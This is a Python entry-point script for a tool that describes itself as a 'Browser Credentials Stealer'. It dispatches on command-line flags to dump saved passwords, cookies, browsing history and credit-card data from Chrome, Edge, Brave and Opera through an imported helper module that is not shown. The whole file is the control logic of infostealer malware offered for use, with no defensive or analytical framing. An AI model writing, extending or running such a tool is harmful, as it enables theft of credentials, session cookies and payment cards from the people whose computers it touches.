from content.source import *

if __name__ == '__main__':
    chrome = BROWSER(ch_localstate,ch_logindata,ch_cookie,ch_history,ch_creditcard)
    msedge = BROWSER(ms_localstate,ms_logindata,ms_cookie,ms_history,ms_creditcard)
    brave = BROWSER(br_localstate,br_logindata,br_cookie,br_history,br_creditcard)
    opera = BROWSER(op_localstate,op_logindata,op_cookie,op_history,op_creditcard)

    parser = argparse.ArgumentParser(description='Browser Credentials Stealer')
    parser.add_argument('-b','--browser',type=str,metavar='',required=True,help='Browser Name')
    parser.add_argument('-c','--command',type=str,metavar='',required=True,help='Command to Excute')
    args = parser.parse_args()

    if args.browser == 'chrome' and args.command == 'passwords':
        Banner('CHROME PASSWORD')
        chrome.PASS()
    elif args.browser == 'chrome' and args.command == 'cookies':
        Banner('CHROME COOKIES')
        chrome.COOKIE()
    elif args.browser == 'chrome' and args.command == 'history':
        Banner('CHROME HISTORY')
        chrome.HISTORY()
    elif args.browser == 'chrome' and args.command == 'creditcards':
        Banner('CHROME CARDS')
        chrome.CREDIT_CARD()
    #-----------------------------
    elif args.browser == 'msedge' and args.command == 'passwords':
        Banner('MSEDGE PASSWORDS')
        msedge.PASS()
    elif args.browser == 'msedge' and args.command == 'cookies':
        Banner('MSEDGE COOKIES')
        msedge.COOKIE()
    elif args.browser == 'msedge' and args.command == 'history':
        Banner('MSEDGE HISTROY')
        msedge.HISTORY()
    elif args.browser == 'msedge' and args.command == 'creditcards':
        Banner('MSEDGE CARDS')
        msedge.CREDIT_CARD()
    #-----------------------------
    try:
        if args.browser == 'opera' and args.command == 'passwords':
            Banner('OPERA PASSWORDS')
            opera.PASS()
        elif args.browser == 'opera' and args.command == 'cookies':
            Banner('OPERA COOKIES')
            opera.COOKIE()
        elif args.browser == 'opera' and args.command == 'history':
            Banner('OPERA HISTROY')
            opera.HISTORY()
        elif args.browser == 'opera' and args.command == 'creditcards':
            Banner('OPERA CARDS')
            opera.CREDIT_CARD()
    except FileNotFoundError:
        print('Opera Not Found')
    #-----------------------------
    try:
        if args.browser == 'brave' and args.command == 'passwords':
            Banner('BRAVE PASSWORDS')
            brave.PASS()
        elif args.browser == 'brave' and args.command == 'cookies':
            Banner('BRAVE COOKIES')
            brave.COOKIE()
        elif args.browser == 'brave' and args.command == 'history':
            Banner('BRAVE HISTORY')
            brave.HISTORY()
        elif args.browser == 'brave' and args.command == 'creditcards':
            Banner('BRAVE CARDS')
            brave.CREDIT_CARD()
    except FileNotFoundError:
        print('Brave Not Found')
